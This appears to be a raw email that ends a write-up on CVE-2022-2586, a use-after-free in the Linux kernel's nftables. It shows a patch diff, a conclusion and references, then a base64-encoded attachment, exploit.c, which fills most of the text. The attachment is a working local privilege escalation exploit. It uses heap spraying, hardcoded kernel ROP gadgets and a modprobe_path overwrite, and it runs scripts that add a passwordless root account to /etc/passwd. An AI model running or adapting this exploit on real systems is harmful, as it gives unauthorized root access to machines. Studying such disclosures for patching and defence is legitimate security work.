p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp; const struct n=
lattr *nla, u8 genmask)</p>
<p class=3D"MsoNormal">{</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; struct nftables_pernet *nft_net =3D nft_pernet(net);</p>
<p class=3D"MsoNormal">@@ -3853,6 +3854,7 @@ static struct nft_set *nft_set=
_lookup_byid(const struct net *net,</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; struct nf=
t_set *set =3D nft_trans_set(trans);</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (id =
=3D=3D nft_trans_set_id(trans) &amp;&amp;</p>
<p class=3D"MsoNormal">+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; s=
et-&gt;table =3D=3D table &amp;&amp;</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nb=
sp;&nbsp; nft_active_genmask(set, genmask))</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return set;</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; =
}</p>
<p class=3D"MsoNormal">@@ -3873,7 +3875,7 @@ struct nft_set *nft_set_lookup=
_global(const struct net *net,</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; =
if (!nla_set_id)</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return se=
t;</p>
<p class=3D"MsoNormal">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set =3D nft=
_set_lookup_byid(net, nla_set_id, genmask);</p>
<p class=3D"MsoNormal">+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set =3D nft=
_set_lookup_byid(net, table, nla_set_id, genmask);</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; }</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; return set;</p>
<p class=3D"MsoNormal">}</p>
<p class=3D"MsoNormal">```</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">## Conclusion</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">In this post we analyzed a use-after-free in the Lin=
ux Kernel and our solution to develop a LPE exploit that bypasses the defau=
lt mitigations (SMAP, SMEP, KASLR, Heap randomization, ...).</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">## References</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">Patches:</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">- \[1\] [https://lore.kernel.org/netfilter-devel/202=
20809170148.164591-1-cascardo@canonical.com/T/](https://lore.kernel.org/net=
filter-devel/20220809170148.164591-1-cascardo@canonical.com/T/)</p>
<p class=3D"MsoNormal">- \[2\] [https://lore.kernel.org/all/20220819153832.=
533116527@linuxfoundation.org/](https://lore.kernel.org/all/20220819153832.=
533116527@linuxfoundation.org/)</p>
<p class=3D"MsoNormal">- \[3\] [https://lore.kernel.org/lkml/20220819153832=
.580611023@linuxfoundation.org/](https://lore.kernel.org/lkml/2022081915383=
2.580611023@linuxfoundation.org/)</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">Advisory and disclosure:</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">- \[4\] [https://www.zerodayinitiative.com/advisorie=
s/ZDI-22-1118/](https://www.zerodayinitiative.com/advisories/ZDI-22-1118/)<=
/p>
<p class=3D"MsoNormal">- \[5\] [https://www.openwall.com/lists/oss-security=
/2022/08/09/5](https://www.openwall.com/lists/oss-security/2022/08/09/5)</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">Distribution kernel updates:</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">- \[6\] [https://ubuntu.com/security/CVE-2022-2586](=
https://ubuntu.com/security/CVE-2022-2586)</p>
<p class=3D"MsoNormal">- \[7\] [https://security-tracker.debian.org/tracker=
/CVE-2022-2586](https://security-tracker.debian.org/tracker/CVE-2022-2586)<=
/p>
<p class=3D"MsoNormal">- \[8\] [https://access.redhat.com/security/cve/cve-=
2022-2586](https://access.redhat.com/security/cve/cve-2022-2586)</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
</div>
</body>
</html>

--_000_SA1PR06MB8071EFD7F55B335FB7D01E87D8769SA1PR06MB8071namp_--

--_004_SA1PR06MB8071EFD7F55B335FB7D01E87D8769SA1PR06MB8071namp_
Content-Type: text/plain; name="exploit.c"
Content-Description: exploit.c
Content-Disposition: attachment; filename="exploit.c"; size=34180;
	creation-date="Mon, 29 Aug 2022 19:22:26 GMT";
	modification-date="Mon, 29 Aug 2022 19:22:26 GMT"
Content-Transfer-Encoding: base64

LyoKICogTFBFIE4tZGF5IEV4cGxvaXQgZm9yIENWRS0yMDIyLTI1ODY6IExp
bnV4IGtlcm5lbCBuZnRfb2JqZWN0IFVBRgogKiBnY2MgZXhwbG9pdC5jIC1v
IGV4cGxvaXQgLWxtbmwgLWxuZnRubCAtbm8tcGllIC1scHRocmVhZAogKiBB
dXRob3I6IEFsZWphbmRybyBHdWVycmVybyA8YWd1ZXJyZXJvQHF1YWx5cy5j
b20+CiAqIENvcHlyaWdodCAoQykgMjAyMiBRdWFseXMsIEluYy4KICoKICog
VGhpcyBwcm9ncmFtIGlzIGZyZWUgc29mdHdhcmU6IHlvdSBjYW4gcmVkaXN0
cmlidXRlIGl0IGFuZC9vciBtb2RpZnkKICogaXQgdW5kZXIgdGhlIHRlcm1z
IG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSBhcyBwdWJsaXNo
ZWQgYnkKICogdGhlIEZyZWUgU29mdHdhcmUgRm91bmRhdGlvbiwgZWl0aGVy
IHZlcnNpb24gMyBvZiB0aGUgTGljZW5zZSwgb3IKICogKGF0IHlvdXIgb3B0
aW9uKSBhbnkgbGF0ZXIgdmVyc2lvbi4KICoKICogVGhpcyBwcm9ncmFtIGlz
IGRpc3RyaWJ1dGVkIGluIHRoZSBob3BlIHRoYXQgaXQgd2lsbCBiZSB1c2Vm
dWwsCiAqIGJ1dCBXSVRIT1VUIEFOWSBXQVJSQU5UWTsgd2l0aG91dCBldmVu
IHRoZSBpbXBsaWVkIHdhcnJhbnR5IG9mCiAqIE1FUkNIQU5UQUJJTElUWSBv
ciBGSVRORVNTIEZPUiBBIFBBUlRJQ1VMQVIgUFVSUE9TRS4gIFNlZSB0aGUK
ICogR05VIEdlbmVyYWwgUHVibGljIExpY2Vuc2UgZm9yIG1vcmUgZGV0YWls
cy4KICoKICogWW91IHNob3VsZCBoYXZlIHJlY2VpdmVkIGEgY29weSBvZiB0
aGUgR05VIEdlbmVyYWwgUHVibGljIExpY2Vuc2UKICogYWxvbmcgd2l0aCB0
aGlzIHByb2dyYW0uICBJZiBub3QsIHNlZSA8aHR0cHM6Ly93d3cuZ251Lm9y
Zy9saWNlbnNlcy8+LgogKi8KCiNkZWZpbmUgX0dOVV9TT1VSQ0UKI2luY2x1
ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHN0
cmluZy5oPgojaW5jbHVkZSA8bGludXgvaXAuaD4KI2luY2x1ZGUgPGVycm5v
Lmg+CiNpbmNsdWRlIDxzY2hlZC5oPgojaW5jbHVkZSA8Y3R5cGUuaD4KI2lu
Y2x1ZGUgPHB0aHJlYWQuaD4KI2luY2x1ZGUgPGZjbnRsLmg+CiNpbmNsdWRl
IDx1bmlzdGQuaD4KI2luY2x1ZGUgPHN0ZGRlZi5oPgojaW5jbHVkZSA8dGlt
ZS5oPgojaW5jbHVkZSA8c2lnbmFsLmg+CiNpbmNsdWRlIDxzeXMvcmVzb3Vy
Y2UuaD4KI2luY2x1ZGUgPGxpbnV4L25ldGZpbHRlci5oPgojaW5jbHVkZSA8
bGlibmZ0bmwvY2hhaW4uaD4KI2luY2x1ZGUgPGxpYm5mdG5sL3RhYmxlLmg+
CiNpbmNsdWRlIDxsaWJuZnRubC9zZXQuaD4KI2luY2x1ZGUgPGxpYm5mdG5s
L29iamVjdC5oPgojaW5jbHVkZSA8bGlibmZ0bmwvZXhwci5oPgojaW5jbHVk
ZSA8bGlibW5sL2xpYm1ubC5oPgojaW5jbHVkZSA8bGludXgvbmV0ZmlsdGVy
L25mX3RhYmxlcy5oPgoKI2RlZmluZSBPRkZfVE9fT0JKX0xTVCAxODQKCiNk
ZWZpbmUgVEFCTEVfS0xLX1VBRl9BICJ0YWJsZTFfa2xrIgojZGVmaW5lIFRB
QkxFX0tMS19VQUZfQiAidGFibGUyX2tsayIKI2RlZmluZSBTRVRfS0xLX1VB
RiAic2V0MV9rbGsiCgojZGVmaW5lIFRBQkxFX0hMS19VQUZfQSAidGFibGUx
X2hsayIKI2RlZmluZSBUQUJMRV9ITEtfVUFGX0IgInRhYmxlMl9obGsiCiNk
ZWZpbmUgVEFCTEVfT0JKX1NQUkFZX0EgInRhYmxlM19obGsiCiNkZWZpbmUg
U0VUX0hMS19VQUYgInNldDFfaGxrIgoKI2RlZmluZSBUQUJMRV9SRF9VQUZf
QSAidGFibGUxX3JkIgojZGVmaW5lIFRBQkxFX1JEX1VBRl9CICJ0YWJsZTJf
cmQiCiNkZWZpbmUgT0JKX1JEX1VBRiAib2JqMV9yZCIKI2RlZmluZSBTRVRf
UkRfVUFGICJzZXQxX3JkIgoKI2RlZmluZSBUQUJMRV9SUF9VQUZfQSAidGFi
bGUxX3JwIgojZGVmaW5lIFRBQkxFX1JQX1VBRl9CICJ0YWJsZTJfcnAiCiNk
ZWZpbmUgT0JKX1JQX1VBRiAib2JqMV9ycCIKI2RlZmluZSBTRVRfUlBfVUFG
ICJzZXQxX3JwIgojZGVmaW5lIENIQUlOX1JQX1VBRiAiY2hhaW4xX3JwIgoK
I2RlZmluZSBERUZBVUxUX0JBU0UgMHhmZmZmZmZmZjgxMDAwMDAwCgojZGVm
aW5lIE1BWF9GRFMgMTAyNAojZGVmaW5lIE9CSl9ERUZfTkFNRSA4CgojZGVm
aW5lIFNJTkdMRV9PUEVOX09GRiAweDM3Yzg5MAoKI2RlZmluZSBNQVhfU1BS
QVlfVEFCTEVTIDQwOTYqMwoKI2RlZmluZSBUUklHX0hPU1QgIjEyNy4wLjAu
MSIKI2RlZmluZSBUUklHX1BPUlQgMTMzNwoKI2RlZmluZSBVTlNIQVJFX1BB
VEggIi9iaW4vdW5zaGFyZSIKCiNkZWZpbmUgRFVNTVlfTU9EUFJPQkVfVFJJ
R0dFUiAiL3RtcC9wIgojZGVmaW5lIENBTExCQUNLX1JPT1RfU0NSSVBUICIv
dG1wL3giCgojZGVmaW5lIERFRl9DT1JFIDMKCiNkZWZpbmUgU0Egc3RydWN0
IHNvY2thZGRyCgp0eXBlZGVmIGVudW0gewoJT0JKRUNUX1RZUEVfVU5LTk9X
TiwKCU9CSkVDVF9UWVBFX0NPVU5URVIsCglPQkpFQ1RfVFlQRV9MSU1JVAp9
IG9ial90OwoKLyogRnVuY3Rpb24gcHJvdG90eXBlIGRlZmluaXRpb25zICov
CnZvaWQgbGF1bmNoX3RyaWdnZXIodm9pZCk7CnZvaWQgZGVsZXRlX3RhYmxl
KGNoYXIgKik7CnZvaWQgZHVtbXlfZnVuYyh2b2lkKTsKCi8qIExlYWtlZCBh
ZGRyZXNzZXMgKi8KdWludDY0X3QgdGJsX2xlYWtlZF9hZGRyID0gMDsKdWlu
dDY0X3Qgb2JqX2xlYWtlZF9hZGRyID0gMDsKdWludDY0X3Qgc29fbGVha2Vk
X2FkZHIgPSAwOwoKLyogS0FTTFIgYmFzZSAqLwp1aW50NjRfdCBrYXNscl9i
YXNlID0gREVGQVVMVF9CQVNFOwoKLyogQWRkcmVzc2VzIGZvciBmdW5jdGlv
bnMgb3IgUk9QIGdhZGdldHMgKi8KdWludDY0X3Qgc3RhY2tfcGl2b3RfYWRk
ciA9IDB4ZmZmZmZmZmY4MTc0NzliNjsgLy8gcHVzaCByZGkgOyBwb3AgcnNw
IDsgYWRkIGNsLCBjbCA7IHJldAp1aW50NjRfdCBwb3BfcmRpX3JldCA9IDB4
ZmZmZmZmZmY4MTBhMDZlMDsgLy8gcG9wIHJkaSA7IHJldAp1aW50NjRfdCB4
b3JfZGhfZGhfcmV0ID0gMHhmZmZmZmZmZjgxNTM3YTM5OyAvLyB4b3IgZGgs
IGRoIDsgcmV0CnVpbnQ2NF90IG1vdl9yZGlfcmF4X2puZV94b3JfZWF4X2Vh
eF9yZXQgPSAweGZmZmZmZmZmODE1ZWUyZjQ7IC8vIG1vdiByZGksIHJheCA7
IGpuZSAweGZmZmZmZmZmODE1ZWUyZTEgOyB4b3IgZWF4LCBlYXggOyByZXQK
dWludDY0X3QgY29tbWl0X2NyZWRzID0gMHhmZmZmZmZmZjgxMGUxNTIwOyAv
LyBjb21taXRfY3JlZHMoKQp1aW50NjRfdCBwcmVwYXJlX2tlcm5lbF9jcmVk
ID0gMHhmZmZmZmZmZjgxMGUxNzgwOyAvLyBwcmVwYXJlX2tlcm5lbF9jcmVk
KCkKdWludDY0X3Qga3B0aV90cmFtcG9saW5lID0gMHhmZmZmZmZmZjgxZTAx
MDA2OyAvLyBzd2FwZ3NfcmVzdG9yZV9yZWdzX2FuZF9yZXR1cm5fdG9fdXNl
cm1vZGUgKyAyMgp1aW50NjRfdCBwb3BfcmR4X3JldCA9IDB4ZmZmZmZmZmY4
MTAyMmFiMjsgLy8gcG9wIHJkeCA7IHJldAp1aW50NjRfdCBwb3BfcmF4X3Jl
dCA9IDB4ZmZmZmZmZmY4MTA0NjM2MTsgLy8gcG9wIHJheCA7IHJldAp1aW50
NjRfdCBtb3ZfcXB0cl9yZHhfcmF4X3JldCA9IDB4ZmZmZmZmZmY4MTY1YWE4
NTsgLy8gbW92IHF3b3JkIHB0ciBbcmR4XSwgcmF4IDsgcmV0CnVpbnQ2NF90
IG1vZHByb2JlX3BhdGggPSAweGZmZmZmZmZmODJlOGEwZTA7IC8vIG1vZHBy
b2JlX3BhdGgKCi8qIFNhdmVkIHVzZXJsYW5kIHJlZ2lzdGVycyAqLwp1aW50
NjRfdCB1c2VyX3JpcCA9ICh1aW50NjRfdClkdW1teV9mdW5jOwp1aW50NjRf
dCB1c2VyX2NzID0gMDsKdWludDY0X3QgdXNlcl9yZmxhZ3MgPSAwOwp1aW50
NjRfdCB1c2VyX3NwID0gMDsKdWludDY0X3QgdXNlcl9zcyA9IDA7CgovKiBm
aWxlIGRlc2NyaXB0b3JzIGZvciBzZXFfb3BlcmF0aW9ucyBzcHJheWluZyAq
LwppbnQgZmRzW01BWF9GRFNdID0geyAwIH07CgppbnQgZmlyc3RfdGJsX3Nw
ID0gMTsKY2hhciAqKnRibF9wdHIgPSBOVUxMOwoKdm9pZCBkdW1teV9mdW5j
KHZvaWQpIHsKCWV4aXQoMCk7CglyZXR1cm47Cn0KCi8qIEV4aXQgcHJpbnRp
bmcgYSBtZXNzYWdlIGJlZm9yZSAqLwp2b2lkIGJ5ZShjb25zdCBjaGFyICpt
c2cpIHsKCWlmKG1zZyAhPSBOVUxMKQoJCXB1dHMobXNnKTsKCWV4aXQoMSk7
CglyZXR1cm47Cn0KCi8qIExhdW5jaCB0aGUgdHJpZ2dlciBhbmQgZ2V0IHJv
b3QhICovCnZvaWQgbGF1bmNoX3RyaWdnZXIodm9pZCkgewoJc3lzdGVtKERV
TU1ZX01PRFBST0JFX1RSSUdHRVIgIiAyPi9kZXYvbnVsbCIpOwoJc3lzdGVt
KCJzdSByMDB0Iik7CglyZXR1cm47Cn0KCi8qIFByZXBhcmUgZHVtbXkgc2Ny
aXB0IGFuZCBjYWxsYmFjayBzY3JpcHQgKi8Kdm9pZCBkcm9wX2NhbGxiYWNr
X3NjcmlwdHModm9pZCkgewoJc3lzdGVtKCJiYXNoIC1jIFwiZWNobyAtZSAn
XHhmZlx4ZmZceGZmXHhmZlx4ZmZceGZmJyA+ICIgRFVNTVlfTU9EUFJPQkVf
VFJJR0dFUiAiXCIiKTsKCXN5c3RlbSgiY2htb2QgK3ggIiBEVU1NWV9NT0RQ
Uk9CRV9UUklHR0VSKTsKCXN5c3RlbSgiZWNobyAnIyEvYmluL2Jhc2gnID4g
IiBDQUxMQkFDS19ST09UX1NDUklQVCk7CglzeXN0ZW0oImVjaG8gJ2VjaG8g
XCJyMDB0OjowOjA6cjAwdDovOi9iaW4vc2hcIiA+PiAvZXRjL3Bhc3N3ZCcg
Pj4gIiBDQUxMQkFDS19ST09UX1NDUklQVCk7CglzeXN0ZW0oImNobW9kICt4
ICIgQ0FMTEJBQ0tfUk9PVF9TQ1JJUFQpOwoJcmV0dXJuOwp9CgovKiBTYXZl
IGluaXRpYWwgdXNlcmxhbmQgcmVnaXN0ZXJzICovCnZvaWQgc2F2ZV9zdGF0
ZSh2b2lkKSB7CglfX2FzbV9fKCIuaW50ZWxfc3ludGF4IG5vcHJlZml4OyIK
CSJtb3YgdXNlcl9jcywgY3M7IgoJIm1vdiB1c2VyX3NzLCBzczsiCgkibW92
IHVzZXJfc3AsIHJzcDsiCgkicHVzaGY7IgoJInBvcCB1c2VyX3JmbGFnczsi
CgkiLmF0dF9zeW50YXgiKTsKCXJldHVybjsKfQoKLyogSGV4ZHVtcCB1dGls
aXR5IGZvciBkZWJ1Z2dpbmcgcHVycG9zZXMgKi8Kdm9pZCBoZXhkdW1wKHZv
aWQgKm1lbSwgdW5zaWduZWQgaW50IGxlbikgewoJdW5zaWduZWQgaW50IGkg
PSAwLCBqID0gMDsKCglmb3IoaSA9IDA7IGkgPCBsZW4gKyAoKGxlbiAlIDE2
KSA/ICgxNiAtIGxlbiAlIDE2KSA6IDApOyBpKyspIHsKCQlpZihpICUgMTYg
PT0gMCkKCQkJcHJpbnRmKCIweCUwNng6ICIsIGkpOwoKCQlpZihpIDwgbGVu
KQoJCQlwcmludGYoIiUwMnggIiwgMHhGRiAmICgoY2hhciopbWVtKVtpXSk7
CgkJZWxzZQoJCQlwcmludGYoIiAgICIpOwoKCQlpZihpICUgMTYgPT0gKDE2
IC0gMSkpIHsKCQkJZm9yKGogPSBpIC0gKDE2IC0gMSk7IGogPD0gaTsgaisr
KSB7CgkJCQlpZihqID49IGxlbikKCQkJCQlwdXRjaGFyKCcgJyk7CgkJCQll
bHNlIGlmKGlzcHJpbnQoKChjaGFyKiltZW0pW2pdKSkKCQkJCQlwdXRjaGFy
KDB4RkYgJiAoKGNoYXIqKW1lbSlbal0pOwoJCQkJZWxzZQoJCQkJCXB1dGNo
YXIoJy4nKTsKCQkJfQoJCQlwdXRjaGFyKCdcbicpOwoJCX0KCX0KCXJldHVy
bjsKfQoKLyogQXNzaWduIHRvIGEgc3BlY2lmaWMgQ1BVIGNvcmUgKi8Kdm9p
ZCBhc3NpZ25fdG9fY29yZShpbnQgY29yZV9pZCkgewoJY3B1X3NldF90IG1h
c2s7CglDUFVfWkVSTygmbWFzayk7CglDUFVfU0VUKGNvcmVfaWQsICZtYXNr
KTsKCWlmKHNjaGVkX3NldGFmZmluaXR5KGdldHBpZCgpLCBzaXplb2YobWFz
ayksICZtYXNrKSA8IDApCgkJYnllKCJbLV0gRXJyb3IgYXQgc2NoZWRfc2V0
YWZmaW5pdHkoKSIpOwoJcmV0dXJuOwp9CgovKiBNb2RpZnkgcHJvY2VzcyBy
bGltaXQgZm9yIFJMSU1JVF9OT0ZJTEUgKi8Kdm9pZCBtb2RpZnlfcmxpbWl0
KHZvaWQpIHsKCXN0cnVjdCBybGltaXQgb2xkX2xpbSwgbGltLCBuZXdfbGlt
OwoJCglpZihnZXRybGltaXQoUkxJTUlUX05PRklMRSwgJm9sZF9saW0pICE9
IDApCgkJYnllKCJbLV0gRXJyb3IgaW4gZ2V0cmxpbWl0KCkiKTsKCQkKCWxp
bS5ybGltX2N1ciA9IG9sZF9saW0ucmxpbV9tYXg7CglsaW0ucmxpbV9tYXgg
PSBvbGRfbGltLnJsaW1fbWF4OwoKCWlmKHNldHJsaW1pdChSTElNSVRfTk9G
SUxFLCAmbGltKSA9PSAtMSkKCQlieWUoIlstXSBFcnJvciBhdCBzZXRybGlt
aXQoKSIpOwoKCXJldHVybjsKfQoKLyogR2VuZXJhdGUgYSByYW5kb20gbmFt
ZSAqLwpjaGFyICpnZW5lcmF0ZV9ybmRfbmFtZSh2b2lkKSB7CgljaGFyIGRp
Y3RbXSA9ICJBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZmdoaWpr
bG1ub3BxcnN0dXZ3eHl6MTIzNDU2Nzg5MF8iOwoJY2hhciAqcHRyID0gY2Fs
bG9jKE9CSl9ERUZfTkFNRSArIDEsIHNpemVvZihjaGFyKSk7CgkKCWlmKCFw
dHIpCgkJYnllKCJbLV0gRXJyb3IgYXQgY2FsbG9jKCkiKTsKCQoJZm9yKGlu
dCBpID0gMCA7IGkgPCBPQkpfREVGX05BTUUgOyBpKyspCgkJcHRyW2ldID0g
ZGljdFtyYW5kKCkgJSBzdHJsZW4oZGljdCldOwoJCglyZXR1cm4gcHRyOwp9
CgovKiBBcHBlbmQgYSB0YWJsZSB0byB0aGUgbGlzdCBvZiBzcHJheWVkIG9u
ZXMgKi8Kdm9pZCB0YmxfYXBwZW5kX25hbWUoY2hhciAqdGFibGVfbmFtZSkg
ewoJaW50IGkgPSAwLCBzID0gMDsKCQoJaWYoIXRibF9wdHIpCgkJYnllKCJb
LV0gdGJsX3B0ciB1bmluaXRpYWxpemVkIik7CgkKCXdoaWxlKGkgPCBNQVhf
U1BSQVlfVEFCTEVTKSB7CgkJaWYodGJsX3B0cltpXSA9PSBOVUxMKSB7CgkJ
CXMgPSAxOwoJCQl0YmxfcHRyW2ldID0gc3RyZHVwKHRhYmxlX25hbWUpOwoJ
CQlicmVhazsKCQl9CgkJaSsrOwoJfQoJCglpZighcykKCQlieWUoIlstXSBW
YWx1ZSBNQVhfU1BSQVlfVEFCTEVTIGV4Y2VlZGVkIik7CgoJcmV0dXJuOwp9
CgovKiBDbGVhbnVwIGFsbCB0aGUgdGFibGVzIHdlIHNwcmF5ZWQgd2l0aCAq
Lwp2b2lkIGNsZWFudXBfc3ByYXlfdGFibGVzKHZvaWQpIHsKCWludCBpID0g
MDsKCQoJaWYoIXRibF9wdHIpCgkJYnllKCJbLV0gdGJsX3B0ciB1bmluaXRp
YWxpemVkIik7CgoJd2hpbGUoaSA8IE1BWF9TUFJBWV9UQUJMRVMpIHsKCQlp
Zih0YmxfcHRyW2ldICE9IE5VTEwpCgkJCWRlbGV0ZV90YWJsZSh0YmxfcHRy
W2ldKTsKCQlpKys7Cgl9CgkJCglyZXR1cm47Cn0KCi8qIFNwcmF5IHdpdGgg
bmxhX21lbWR1cCgpIGFsbG9jYXRpb25zIChhcmJpdHJhcnkgZGF0YSBhbmQg
c2l6ZSkgKi8Kdm9pZCBzcHJheV9tZW1kdXAodm9pZCAqc3ByYXlfZGF0YSwg
c2l6ZV90IHNwcmF5X3NpemUsIHNpemVfdCBuKSB7CglzdHJ1Y3QgbW5sX3Nv
Y2tldCAqcyA9IE5VTEw7CglzdHJ1Y3QgbW5sX25sbXNnX2JhdGNoICpiYXRj
aCA9IE5VTEw7CglzdHJ1Y3Qgbmxtc2doZHIgKm5oID0gTlVMTDsKCWludCBy
ID0gMCwgc2VxID0gMDsKCWNoYXIgYnVmWzE2Mzg0XSA9IHsgMCB9OwoJY2hh
ciAqdGFibGVfbmFtZSA9IE5VTEw7CglzdHJ1Y3QgbmZ0bmxfdGFibGUgKnRh
YmxlID0gTlVMTDsKCXNpemVfdCBpID0gMDsKCQoJYXNzaWduX3RvX2NvcmUo
REVGX0NPUkUpOwoJCglpZihmaXJzdF90Ymxfc3ApIHsKCQlmaXJzdF90Ymxf
c3AgPSAwOwoJCXRibF9wdHIgPSBjYWxsb2MoTUFYX1NQUkFZX1RBQkxFUyAr
IDEsIHNpemVvZihjaGFyICopKTsKCQlpZighdGJsX3B0cikKCQkJYnllKCJb
LV0gRXJyb3IgYXQgY2FsbG9jKCkiKTsKCX0KCgl3aGlsZShpIDwgbikgewoJ
CXRhYmxlX25hbWUgPSBnZW5lcmF0ZV9ybmRfbmFtZSgpOwoJCQoJCXRibF9h
cHBlbmRfbmFtZSh0YWJsZV9uYW1lKTsKCgkJcyA9IG1ubF9zb2NrZXRfb3Bl
bihORVRMSU5LX05FVEZJTFRFUik7CgkJaWYoIXMpCgkJCWJ5ZSgiWy1dIEZh
aWxlZCB0byBjcmVhdGUgbmV0ZmlsdGVyIHNvY2tldCIpOwoJCQoJCWJhdGNo
ID0gbW5sX25sbXNnX2JhdGNoX3N0YXJ0KGJ1Ziwgc2l6ZW9mKGJ1ZikpOwoJ
CW5mdG5sX2JhdGNoX2JlZ2luKG1ubF9ubG1zZ19iYXRjaF9jdXJyZW50KGJh
dGNoKSwgc2VxKyspOwoJCW1ubF9ubG1zZ19iYXRjaF9uZXh0KGJhdGNoKTsK
CQkKCQl0YWJsZSA9IG5mdG5sX3RhYmxlX2FsbG9jKCk7CgkJbmZ0bmxfdGFi
bGVfc2V0X3N0cih0YWJsZSwgTkZUTkxfVEFCTEVfTkFNRSwgdGFibGVfbmFt
ZSk7CgkJbmZ0bmxfdGFibGVfc2V0X2RhdGEodGFibGUsIE5GVE5MX1RBQkxF
X1VTRVJEQVRBLCBzcHJheV9kYXRhLCBzcHJheV9zaXplKTsKCgkJbmggPSBu
ZnRubF90YWJsZV9ubG1zZ19idWlsZF9oZHIobW5sX25sbXNnX2JhdGNoX2N1
cnJlbnQoYmF0Y2gpLCBORlRfTVNHX05FV1RBQkxFLCBORlBST1RPX0lQVjQs
